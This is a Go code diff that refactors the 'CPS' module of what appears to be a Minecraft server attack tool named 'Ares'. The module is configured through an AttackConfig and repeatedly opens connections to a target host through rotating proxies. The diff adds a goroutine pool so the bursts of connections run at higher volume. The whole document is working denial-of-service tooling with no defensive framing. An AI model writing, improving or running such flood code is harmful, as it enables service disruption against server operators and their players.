@@ -6,20 +6,28 @@ import (
 	"Ares/net/minecraft/packet"
 	"Ares/utils/mcutils"
 	"fmt"
+	"log"
 	"net"
 	"strconv"
 	"time"
+
+	"github.com/panjf2000/ants/v2"
 )
 
 type CPS struct {
 	Config          *core.AttackConfig
 	isRunning       bool
 	handshakePacket packet.Packet
+	pool            *ants.Pool
 }
 
-func (j *CPS) Start() {
-
-	ip, port, err := net.SplitHostPort(j.Config.Host)
+func (c *CPS) Start() {
+	var err error
+	c.pool, err = ants.NewPool(c.Config.PerDelay, ants.WithPreAlloc(true))
+	if err != nil {
+		log.Fatal(err)
+	}
+	ip, port, err := net.SplitHostPort(c.Config.Host)
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -30,25 +38,25 @@ func (j *CPS) Start() {
 		return
 	}
 
-	j.handshakePacket = mcutils.GetHandshakePacket(ip, iport, j.Config.Version, mcutils.Login)
+	c.handshakePacket = mcutils.GetHandshakePacket(ip, iport, c.Config.Version, mcutils.Login)
 
-	j.isRunning = true
+	c.isRunning = true
 
 	done := make(chan struct{})
 
-	for i := 0; i < j.Config.Loops; i++ {
-		j.loop(done)
+	for i := 0; i < c.Config.Loops; i++ {
+		c.loop(done)
 	}
 }
 
-func (j *CPS) loop(done chan struct{}) {
-	ticker := time.NewTicker(j.Config.Delay)
+func (c *CPS) loop(done chan struct{}) {
+	ticker := time.NewTicker(c.Config.Delay)
 	defer ticker.Stop()
 	for {
 		select {
 		case <-ticker.C:
-			for i := 0; i < j.Config.PerDelay; i++ {
-				go j.connect()
+			for i := 0; i < c.Config.PerDelay; i++ {
+				c.pool.Submit(c.connect)
 			}
 		case <-done:
 			return
@@ -56,14 +64,14 @@ func (j *CPS) loop(done chan struct{}) {
 	}
 }
 
-func (j *CPS) connect() {
-	conn, err := minecraft.DialMc(j.Config.Host, j.Config.ProxyManager.GetNext())
+func (c *CPS) connect() {
+	conn, err := minecraft.DialMc(c.Config.Host, c.Config.ProxyManager.GetNext())
 	if err != nil {
 		return
 	}
 	defer conn.Close()
 }
 
-func (j *CPS) Stop() {
-	j.isRunning = false
+func (c *CPS) Stop() {
+	c.isRunning = false
 }
